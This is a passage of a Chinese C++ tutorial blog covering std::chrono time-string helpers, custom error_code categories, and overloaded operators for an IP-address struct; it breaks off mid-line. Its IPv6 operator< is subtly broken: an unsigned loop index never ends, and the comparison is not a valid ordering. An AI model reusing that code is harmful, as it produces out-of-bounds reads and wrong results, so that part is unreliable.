<h3 id="8-8-chrono-时间库"><a href="#8-8-chrono-时间库" class="headerlink" title="8.8. chrono 时间库"></a>8.8. chrono 时间库</h3><h4 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1) 基础用法"></a>1) 基础用法</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std::chrono;</span><br><span class="line">    <span class="comment">// 获取当前系统启动时间</span></span><br><span class="line">    <span class="keyword">auto</span> sysSec = <span class="built_in">duration_cast</span>&lt;seconds&gt;(steady_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>()).<span class="built_in">count</span>();</span><br><span class="line">    <span class="comment">// 获取当前时间戳，基于1970-01-01</span></span><br><span class="line">    <span class="keyword">auto</span> dateSec = <span class="built_in">duration_cast</span>&lt;seconds&gt;(system_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>()).<span class="built_in">count</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-工具函数"><a href="#2-工具函数" class="headerlink" title="2) 工具函数"></a>2) 工具函数</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取当前时间字符串</span></span><br><span class="line"><span class="comment"> * 时间字符串(如：2020-05-02 14:40:31.015)</span></span><br><span class="line"><span class="comment"> * @param bLocal</span></span><br><span class="line"><span class="comment"> * @param bIncludeMS</span></span><br><span class="line"><span class="comment"> * @return std::string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">std::string <span class="title">getTimeString</span><span class="params">(<span class="type">bool</span> bLocal = <span class="literal">true</span>, <span class="type">bool</span> bIncludeMS = <span class="literal">true</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std::chrono;</span><br><span class="line">    <span class="keyword">auto</span> tNow = system_clock::<span class="built_in">now</span>();</span><br><span class="line">    <span class="keyword">auto</span> tSeconds = <span class="built_in">duration_cast</span>&lt;seconds&gt;(tNow.<span class="built_in">time_since_epoch</span>());</span><br><span class="line">    <span class="keyword">auto</span> secNow = tSeconds.<span class="built_in">count</span>();</span><br><span class="line">    tm* tmNow = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (bLocal) &#123;</span><br><span class="line">        tmNow = ::<span class="built_in">localtime</span>((<span class="type">time_t</span>*)&amp;secNow);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        tmNow = ::<span class="built_in">gmtime</span>((<span class="type">time_t</span>*)&amp;secNow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::ostringstream oss;</span><br><span class="line">    oss  &lt;&lt; std::<span class="built_in">put_time</span>(tmNow, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (bIncludeMS) &#123;</span><br><span class="line">        <span class="keyword">auto</span> tMilli  = <span class="built_in">duration_cast</span>&lt;milliseconds&gt;(tNow.<span class="built_in">time_since_epoch</span>());</span><br><span class="line">        <span class="keyword">auto</span> ms  = tMilli  - tSeconds;</span><br><span class="line">        oss  &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">3</span>) &lt;&lt; ms.<span class="built_in">count</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> oss.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 根据系统启动时间（秒）获取时间字符串</span></span><br><span class="line"><span class="comment"> * 时间字符串(如：2020-05-02 14:40:31)</span></span><br><span class="line"><span class="comment"> * @param bLocal</span></span><br><span class="line"><span class="comment"> * @return std::string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">std::string <span class="title">getTimeStrBySysStartTimeS</span><span class="params">(<span class="type">int64_t</span> timeS, <span class="type">bool</span> bLocal = <span class="literal">true</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std::chrono;</span><br><span class="line">    <span class="comment">// 获取当前系统启动时间</span></span><br><span class="line">    <span class="keyword">auto</span> sysSec = <span class="built_in">duration_cast</span>&lt;seconds&gt;(steady_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>()).<span class="built_in">count</span>();</span><br><span class="line">    <span class="comment">// 获取当前时间戳</span></span><br><span class="line">    <span class="keyword">auto</span> dateSec = <span class="built_in">duration_cast</span>&lt;seconds&gt;(system_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>()).<span class="built_in">count</span>();</span><br><span class="line">    <span class="comment">// 计算相对差值更新时间戳</span></span><br><span class="line">    dateSec = dateSec - sysSec + timeS;</span><br><span class="line"></span><br><span class="line">    tm* tmNow = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (bLocal) tmNow = ::<span class="built_in">localtime</span>((<span class="type">time_t</span>*)&amp;dateSec);</span><br><span class="line">    <span class="keyword">else</span> tmNow = ::<span class="built_in">gmtime</span>((<span class="type">time_t</span>*)&amp;dateSec);</span><br><span class="line"></span><br><span class="line">    std::ostringstream oss;</span><br><span class="line">    oss  &lt;&lt; std::<span class="built_in">put_time</span>(tmNow, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> oss.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 根据系统启动时间（毫秒）获取时间字符串</span></span><br><span class="line"><span class="comment"> * 时间字符串(如：2020-05-02 14:40:31.123)</span></span><br><span class="line"><span class="comment"> * @param bLocal</span></span><br><span class="line"><span class="comment"> * @return std::string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">std::string <span class="title">getTimeStrBySysStartTimeMS</span><span class="params">(<span class="type">int64_t</span> timeMS, <span class="type">bool</span> bLocal = <span class="literal">true</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std::chrono;</span><br><span class="line">    <span class="comment">// 获取当前系统启动时间</span></span><br><span class="line">    <span class="keyword">auto</span> sysMS = <span class="built_in">duration_cast</span>&lt;milliseconds&gt;(steady_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>()).<span class="built_in">count</span>();</span><br><span class="line">    <span class="comment">// 获取当前时间戳</span></span><br><span class="line">    <span class="keyword">auto</span> dateMS = <span class="built_in">duration_cast</span>&lt;milliseconds&gt;(system_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>()).<span class="built_in">count</span>();</span><br><span class="line">    <span class="comment">// 计算相对差值更新时间戳</span></span><br><span class="line">    dateMS = dateMS - sysMS + timeMS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> dateSec = dateMS / <span class="number">1000</span>;</span><br><span class="line">    tm* tmNow = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (bLocal) tmNow = ::<span class="built_in">localtime</span>((<span class="type">time_t</span>*)&amp;dateSec);</span><br><span class="line">    <span class="keyword">else</span> tmNow = ::<span class="built_in">gmtime</span>((<span class="type">time_t</span>*)&amp;dateSec);</span><br><span class="line"></span><br><span class="line">    std::ostringstream oss;</span><br><span class="line">    oss  &lt;&lt; std::<span class="built_in">put_time</span>(tmNow, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取秒级时间戳后，将毫秒放到后面</span></span><br><span class="line">    oss  &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">3</span>) &lt;&lt; (dateMS % <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> oss.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-使用注意事项"><a href="#3-使用注意事项" class="headerlink" title="3) 使用注意事项"></a>3) 使用注意事项</h4><ul>
<li>参考 <a href="https://zhuanlan.zhihu.com/p/414702182">自顶向下地聊聊C++的时间处理和chrono库</a></li>
<li>不同平台对<code>steady_clock</code>和<code>system_clock</code>的实现不同</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>windows</th>
<th>linux</th>
<th>mac</th>
</tr>
</thead>
<tbody><tr>
<td>system_clock</td>
<td>GetSystemTimePreciseAsFileTime(&amp;ft)<br>GetSystemTimeAsFileTime(&amp;ft)</td>
<td>clock_gettime(CLOCK_REALTIME, &amp;tp)<br>gettimeofday(&amp;tv, 0)</td>
<td></td>
</tr>
<tr>
<td>steady_clock</td>
<td>QueryPerformanceFrequency()<br>QueryPerformanceCounter(&amp;counter)</td>
<td>clock_gettime(CLOCK_MONOTONIC, &amp;tp)</td>
<td>mach_timebase_info(&amp;MachInfo)</td>
</tr>
</tbody></table>
<ul>
<li>根据实验 <a href="https://www.cnblogs.com/kex1n/p/3297607.html">windows平台时间函数性能比较QueryPerformanceCounter，GetTickCount，ftime，time,GetLocalTime，GetSystemTimeAsFileTime</a> 和 <a href="https://blog.csdn.net/jacicson1987/article/details/123816212">gettimeofday和clock_gettime性能对比</a> 可以看出<ul>
<li>windows上<code>steady_clock</code>和<code>system_clock</code>性能相差几十倍</li>
<li>linux上两个调用几乎没差别</li>
</ul>
</li>
</ul>
<h3 id="8-9-error-code-错误码"><a href="#8-9-error-code-错误码" class="headerlink" title="8.9. error_code 错误码"></a>8.9. error_code 错误码</h3><ul>
<li>需要自己定义<code>error_category</code>，一般作为函数返回错误信息使用，可以自定义错误码和message</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DiyEC</span> : <span class="keyword">public</span> std::error_category &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">        SUCCESS = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">        FAILED_IOCONTEXT_IS_NULL,</span><br><span class="line">        FAILED_IOCONTEXT_NOT_RUN,</span><br><span class="line">        FAILED_TIMEOUT,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">name</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">noexcept</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;DiyEC&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::string <span class="title">message</span><span class="params">(<span class="type">int</span> val)</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> std::map&lt;<span class="type">int</span>, std::string&gt; ecMap = &#123;</span><br><span class="line">            &#123;<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(SUCCESS),                  <span class="string">&quot;success&quot;</span>               &#125;,</span><br><span class="line">            &#123;<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(FAILED_IOCONTEXT_IS_NULL), <span class="string">&quot;io context is null&quot;</span>    &#125;,</span><br><span class="line">            &#123;<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(FAILED_IOCONTEXT_NOT_RUN), <span class="string">&quot;io context not running&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(FAILED_TIMEOUT),           <span class="string">&quot;timeout&quot;</span>               &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> <span class="keyword">auto</span> &amp;iter = ecMap.<span class="built_in">find</span>(val);</span><br><span class="line">        <span class="keyword">if</span> (iter != ecMap.<span class="built_in">end</span>()) <span class="keyword">return</span> iter-&gt;second;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">const</span> std::string <span class="title">unknown</span><span class="params">(<span class="string">&quot;unknown error&quot;</span>)</span></span>;</span><br><span class="line">        <span class="keyword">return</span> unknown;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">const</span> DiyEC &amp;<span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">static</span> DiyEC category;</span><br><span class="line">        <span class="keyword">return</span> category;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">testFunc</span><span class="params">(std::error_code &amp;ec)</span> </span>&#123;</span><br><span class="line">    ec.<span class="built_in">assign</span>(DiyEC::FAILED_IOCONTEXT_IS_NULL, DiyEC::<span class="built_in">getInstance</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::error_code ec;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">testFunc</span>(ec)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;code: &quot;</span> &lt;&lt; ec.<span class="built_in">value</span>() &lt;&lt; <span class="string">&quot;, message: &quot;</span> &lt;&lt; ec.<span class="built_in">message</span>() &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-系统错误码转error-code"><a href="#1-系统错误码转error-code" class="headerlink" title="1) 系统错误码转error_code"></a>1) 系统错误码转<code>error_code</code></h4><ul>
<li>存在两种转换方式，一种是<code>generic_category</code>，一种是<code>system_category</code></li>
<li><code>generic_category</code>主要用于<code>c++</code>定义的一些错误，在linux上和<code>system_category</code>一样都和<code>errno</code>一致</li>
<li>windows上使用<code>system_category</code>可以获取到<code>GetLastError()</code>的错误</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// windows</span></span><br><span class="line"><span class="keyword">auto</span> ec = std::<span class="built_in">error_code</span>(<span class="built_in">GetLastError</span>(), std::<span class="built_in">system_category</span>());</span><br><span class="line"><span class="comment">// linux，下面两种结果一样</span></span><br><span class="line"><span class="keyword">auto</span> ec = std::<span class="built_in">error_code</span>(errno, std::<span class="built_in">system_category</span>());</span><br><span class="line"><span class="keyword">auto</span> ec = std::<span class="built_in">error_code</span>(errno, std::<span class="built_in">generic_category</span>());</span><br></pre></td></tr></table></figure>

<h2 id="9-自定义类型定义操作符"><a href="#9-自定义类型定义操作符" class="headerlink" title="9. 自定义类型定义操作符"></a>9. 自定义类型定义操作符</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __WIN32</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief IP地址类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">ip_type</span> &#123;</span><br><span class="line">    ipv4,  <span class="comment">///&lt; ipv4地址</span></span><br><span class="line">    ipv6,  <span class="comment">///&lt; ipv6地址</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ip_address</span> &#123;</span><br><span class="line">    ip_type type;  <span class="comment">///&lt; ip地址类型 @ref ip_type</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="type">char</span> v4[<span class="number">4</span>];             <span class="comment">///&lt; ipv4地址</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> uv4[<span class="number">4</span>];   <span class="comment">///&lt; ipv4地址,unsigned char</span></span><br><span class="line">        <span class="type">uint32_t</span> v4_addr;       <span class="comment">///&lt; ipv4地址,网络字节序</span></span><br><span class="line">        <span class="type">uint32_t</span> reserved[<span class="number">4</span>];   <span class="comment">///&lt; 用来存储临时数据</span></span><br><span class="line">        <span class="type">char</span> v6[<span class="number">16</span>];            <span class="comment">///&lt; ipv6地址</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> uv6[<span class="number">16</span>];  <span class="comment">///&lt; ipv6地址</span></span><br><span class="line">    &#125; ip;                       <span class="comment">///&lt; ip地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ip_address</span>() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用uint32进行构造，传入主机字节序即可</span></span><br><span class="line">    <span class="built_in">ip_address</span>(<span class="type">uint32_t</span> ipv4) &#123;</span><br><span class="line">        type = ip_type::ipv4;</span><br><span class="line">        ip.v4_addr = <span class="built_in">htonl</span>(ipv4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用uint32进行赋值，传入主机字节序即可</span></span><br><span class="line">    ip_address&amp; <span class="keyword">operator</span>=(<span class="type">uint32_t</span> ipv4) &#123;</span><br><span class="line">        type = ip_type::ipv4;</span><br><span class="line">        ip.v4_addr = <span class="built_in">htonl</span>(ipv4);</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ip_address</span>(<span class="type">const</span> <span class="type">uint8_t</span>* buf, <span class="type">uint32_t</span> len) &#123;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">4</span>) &#123;</span><br><span class="line">            type = ip_type::ipv4;</span><br><span class="line">            <span class="built_in">memcpy</span>(ip.uv4, buf, <span class="number">4</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">16</span>) &#123;</span><br><span class="line">            type = ip_type::ipv6;</span><br><span class="line">            <span class="built_in">memcpy</span>(ip.uv6, buf, <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义各种类型操作符</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> ip_address&amp; A, <span class="type">const</span> ip_address&amp; B) &#123;</span><br><span class="line">    <span class="comment">// 类型不等，ipv4 &lt; ipv6</span></span><br><span class="line">    <span class="keyword">if</span> (A.type != B.type) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A.type == ip_type::ipv4) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (A.type == ip_type::ipv4) &#123;</span><br><span class="line">        <span class="comment">// 转主机字节序对比</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ntohl</span>(A.ip.v4_addr) &lt; <span class="built_in">ntohl</span>(B.ip.v4_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ipv6，从头部开始对比</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="built_in">sizeof</span>(A.ip.uv6) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A.ip.uv6[i] &lt; B.ip.uv6[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> ip_address&amp; lhs, <span class="type">const</span> ip_address&amp; rhs) &#123; <span class="keyword">return</span> lhs &lt; rhs || rhs &lt; lhs; &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> ip_address&amp; lhs, <span class="type">const</span> ip_address&amp; rhs) &#123; <span class="keyword">return</span> !(lhs != rhs); &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="keyword">operator</span>&lt;=(<span class="type">const</span> ip_address&amp; lhs, <span class="type">const</span> ip_address&amp; rhs) &#123; <span class="built_in">return</span> (lhs &lt; rhs) || (lhs == rhs); &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="keyword">operator</span>&gt;(<span class="type">const</span> ip_address&amp; lhs, <span class="type">const</span> ip_address&amp; rhs) &#123; <span class="keyword">return</span> !(lhs &lt;= rhs); &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="keyword">operator</span>&gt;=(<span class="type">const</span> ip_address&amp; lhs, <span class="type">const</span> ip_address&amp; rhs) &#123; <span class="keyword">return</span> !(lhs &lt; rhs); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 ++ip 的操作， ip++不会调用此操作符</span></span><br><span class="line"><span class="type">static</span> ip_address&amp; <span class="keyword">operator</span>++(ip_address&amp; lhs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lhs.type == ip_type::ipv6) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">sizeof</span>(lhs.ip.v6) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lhs.ip.uv6[i] != <span class="number">0xff</span>) &#123;</span><br><span class="line">                lhs.ip.uv6[i]++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            lhs.ip.uv6[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs.type == ip_type::ipv4) &#123;</span><br><span class="line">        <span class="comment">// 转主机字节序直接++</span></span><br><span class="line">        lhs.ip.v4_addr = <span class="built_in">htonl</span>(<span class="built_in">ntohl</span>(lhs.ip.v4_addr) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lhs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> ip_address&amp; <span class="keyword">operator</span>--(ip_address&amp; lhs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lhs.type == ip_type::ipv6) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">sizeof</span>(lhs.ip.v6) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lhs.ip.uv6[i] != <span class="number">0x00</span>) &#123;</span><br><span class="line">                lhs.ip.uv6[i]--;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            lhs.ip.uv6[i] = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs.type == ip_type::ipv4) &#123;</span><br><span class="line">        <span class="comment">// 转主机字节序直接--</span></span><br><span class="line">        lhs.ip.v4_addr = <span class="built_in">htonl</span>(<span class="built_in">ntohl</span>(lhs.ip.v4_addr) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lhs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ip = ip + 1</span></span><br><span class="line"><span class="type">static</span> ip_address <span class="keyword">operator</span>+(ip_address ip, <span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; value; ++i) &#123;</span><br><span class="line">            ++ip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &gt; value; --i) &#123;</span><br><span class="line">            --ip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> ip_address <span class="keyword">operator</span>-(ip_address ip, <span class="type">int</span> value) &#123; <span class="keyword">return</span> ip + (-value); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ip += 1</span></span><br><span class="line"><span class="type">static</span> ip_address <span class="keyword">operator</span>+=(ip_address&amp; ip, <span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; value; ++i) &#123;</span><br><span class="line">            ++ip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &gt; value; --i) &#123;</span><br><span class="line">            --ip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> ip_address <span class="keyword">operator</span>-=(ip_address&amp; ip, <span class="type">int</span> value) &#123;</span><br><span class="line">    ip += (-value);</span><br><span class="line">    <span class="keyword">return</span> ip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 ip++ 的行为</span></span><br><span class="line"><span class="type">static</span> ip_address <span class="keyword">operator</span>++(ip_address&amp; ip, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">auto</span> tmp = ip;</span><br><span class="line">    ++ip;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> ip_address <span class="keyword">operator</span>--(ip_address&amp; ip, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">auto</span> tmp = ip;</span><br><span class="line">    --ip;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; ip 和 std::cout &lt;&lt; ip &lt;&lt; std::endl</span></span><br><span class="line"><span class="type">static</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; out, <span class="type">const</span> ip_address&amp; ip) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ip.type == ip_type::ipv4) &#123;</span><br><span class="line">        out &lt;&lt; (std::<span class="built_in">to_string</span>(ip.ip.uv4[<span class="number">0</span>]) + <span class="string">&quot;.&quot;</span> + std::<span class="built_in">to_string</span>(ip.ip.uv4[<span class="number">1</span>]) + <span class="string">&quot;.&quot;</span> + std::<span class="built_in">to_string</span>(ip.ip.uv4[<span class="number">2</span>]) +</span><br><span class="line">                <span class="string">&quot;.&quot;</span> + std::<span class="built_in">to_string</span>(ip.ip.uv4[<span class="number">3</span>]));</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    std::stringstream ss;</span><br><span class="line">    ss &lt;&lt; std::hex;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(ip.ip.uv6); i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            ss &lt;&lt; <span class="string">&quot;:&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ss &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">2</span>) &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">uint16_t</span>&gt;(ip.ip.uv6[i]);</span><br><span class="line">        ss &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">2</span>) &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">uint16_t</span>&gt;(ip.ip.uv6[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    out &lt;&lt; ss.<span 